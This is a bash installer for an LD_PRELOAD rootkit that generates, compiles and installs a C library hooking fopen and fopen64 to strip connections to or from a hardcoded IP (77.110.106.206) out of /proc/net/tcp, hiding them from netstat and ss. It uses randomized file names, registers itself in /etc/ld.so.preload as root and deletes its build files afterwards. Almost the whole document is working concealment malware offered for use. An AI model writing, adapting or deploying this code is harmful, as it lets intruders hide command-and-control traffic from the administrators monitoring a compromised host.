#!/bin/bash
set -e  

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script needs to be run as root for installation steps."
        print_error "Please run: sudo $0"
        exit 1
    fi
}

generate_random_names() {
    RANDOM_SUFFIX=$(head /dev/urandom | tr -dc a-z | head -c $((8 + RANDOM % 5)))
    
    C_FILENAME="net_filter_${RANDOM_SUFFIX}.c"
    
    LIB_FILENAME="libnet_filter_${RANDOM_SUFFIX}.so"
    
    print_status "Generated random C filename: $C_FILENAME"
    print_status "Generated random library name: $LIB_FILENAME"
}

get_ip_to_hide() {
    echo ""
    echo "This script will create a library that hides network connections from netstat/ss output."
    echo ""
    IP_TO_HIDE="77.110.106.206"
    
    print_status "Will hide network connections to/from IP: $IP_TO_HIDE"
}

create_c_file() {
    print_status "Creating $C_FILENAME..."
    
    cat > $C_FILENAME << EOF
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <limits.h>
#include <arpa/inet.h>

#define MAGIC_IP "$IP_TO_HIDE"

static FILE *(*original_fopen)(const char *filename, const char *mode) = NULL;
static FILE *(*original_fopen64)(const char *filename, const char *mode) = NULL;

// Convert hex IP address to dotted decimal format
void hex_to_ip(const char *hex_ip, char *ip_str) {
    unsigned int ip_int;
    sscanf(hex_ip, "%X", &ip_int);
    
    // Convert from network byte order to host byte order
    struct in_addr addr;
    addr.s_addr = ip_int;
    strcpy(ip_str, inet_ntoa(addr));
}

FILE *forge_proc_net_tcp(const char *filename)
{
    char line[LINE_MAX];
    unsigned long rxq, txq, time_len, retr, inode;
    int local_port, rem_port, d, state, uid, timer_run, timeout;
    char rem_addr[128], local_addr[128], more[512];
    char local_ip[16], remote_ip[16];
    
    if (!original_fopen) {
        original_fopen = dlsym(RTLD_NEXT, "fopen");
    }
    
    FILE *tmp = tmpfile();
    FILE *pnt = original_fopen(filename, "r");
    
    if (!pnt) {
        fclose(tmp);
        return NULL;
    }
    
    while (fgets(line, LINE_MAX, pnt) != NULL) {
        sscanf(line,
            "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\\n",
            &d, local_addr, &local_port, rem_addr, &rem_port, &state,
            &txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout,
            &inode, more);
        
        // Convert hex addresses to IP strings
        hex_to_ip(local_addr, local_ip);
        hex_to_ip(rem_addr, remote_ip);
        
        // Skip lines with the magic IP address
        if (strcmp(local_ip, MAGIC_IP) == 0 || strcmp(remote_ip, MAGIC_IP) == 0) {
            continue;
        }
        
        fputs(line, tmp);
    }
    
    fclose(pnt);
    fseek(tmp, 0, SEEK_SET);
    
    return tmp;
}

FILE *fopen(const char *filename, const char *mode)
{
    if (!original_fopen) {
        original_fopen = dlsym(RTLD_NEXT, "fopen");
        if (!original_fopen) {
            fprintf(stderr, "Error in dlsym: %s\\n", dlerror());
            return NULL;
        }
    }
    
    if (strcmp(filename, "/proc/net/tcp") == 0 || strcmp(filename, "/proc/net/tcp6") == 0) {
        return forge_proc_net_tcp(filename);
    }
    
    return original_fopen(filename, mode);
}

FILE *fopen64(const char *filename, const char *mode)
{
    if (!original_fopen64) {
        original_fopen64 = dlsym(RTLD_NEXT, "fopen64");
        if (!original_fopen64) {
            fprintf(stderr, "Error in dlsym: %s\\n", dlerror());
            return NULL;
        }
    }
    
    if (strcmp(filename, "/proc/net/tcp") == 0 || strcmp(filename, "/proc/net/tcp6") == 0) {
        return forge_proc_net_tcp(filename);
    }
    
    return original_fopen64(filename, mode);
}
EOF

    print_status "Created $C_FILENAME with IP filter: $IP_TO_HIDE"
}

create_makefile() {
    print_status "Creating Makefile..."
    
    cat > Makefile << EOF
all: $LIB_FILENAME

$LIB_FILENAME: $C_FILENAME
	gcc -Wall -fPIC -shared -o $LIB_FILENAME $C_FILENAME -ldl

.PHONY: clean
clean:
	rm -f $LIB_FILENAME
EOF

    print_status "Created Makefile"
}

compile_library() {
    print_status "Compiling the shared library..."
    
    if ! command -v gcc &> /dev/null; then
        print_error "gcc is not installed. Please install gcc first."
        print_error "On Ubuntu/Debian: sudo apt-get install gcc"
        print_error "On CentOS/RHEL: sudo yum install gcc"
        exit 1
    fi
    
    make
    
    if [[ ! -f "$LIB_FILENAME" ]]; then
        print_error "Compilation failed - $LIB_FILENAME not created"
        exit 1
    fi
    
    print_status "Successfully compiled $LIB_FILENAME"
}

install_library() {
    print_status "Installing the library to /usr/local/lib/..."
    
    mkdir -p /usr/local/lib/
    
    cp $LIB_FILENAME /usr/local/lib/
    
    chmod 755 /usr/local/lib/$LIB_FILENAME
    print_status "Library installed to /usr/local/lib/$LIB_FILENAME"
}

configure_preload() {
    print_status "Configuring ld.so.preload..."
    
    if grep -q "$LIB_FILENAME" /etc/ld.so.preload 2>/dev/null; then
        print_warning "$LIB_FILENAME already exists in /etc/ld.so.preload"
        read -p "Do you want to continue anyway? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            print_status "Skipping ld.so.preload configuration"
            return
        fi
    fi
    
    echo "/usr/local/lib/$LIB_FILENAME" >> /etc/ld.so.preload
    
    print_status "Added library to /etc/ld.so.preload"
}

cleanup() {
    print_status "Cleaning up temporary files..."
    rm -f $C_FILENAME Makefile $LIB_FILENAME
}

# Main execution
main() {
    echo "=============================================="
    echo "    Network Connection Hider"
    echo "=============================================="
    
    # Check if running as root
    check_root
    
    # Clean up any existing files
    rm -f *.c Makefile *.so 2>/dev/null || true
    
    # Generate random filenames
    generate_random_names
    
    # Get IP to hide from user
    get_ip_to_hide
    
    # Create files
    create_c_file
    create_makefile
    
    # Compile
    compile_library
    
    # Install
    install_library
    configure_preload
    
    # Cleanup
    cleanup
    
    echo ""
    print_status "Installation completed successfully!"
    print_warning "The library is now active and will hide network connections to/from IP $IP_TO_HIDE."
    print_warning "To remove the filter, edit /etc/ld.so.preload and remove the $LIB_FILENAME line."
    echo ""
    echo "To test the filter, try:"
    echo "  netstat -ntp | grep ESTABLISHED | awk '{print \$5}' | cut -d: -f1 | sort | uniq -c | sort -nr"
    echo "  netstat -ntp | grep $IP_TO_HIDE"
    echo ""
}

# Handle script interruption
trap 'print_error "Installation interrupted"; cleanup; exit 1' INT TERM

# Run main function
main "$@"
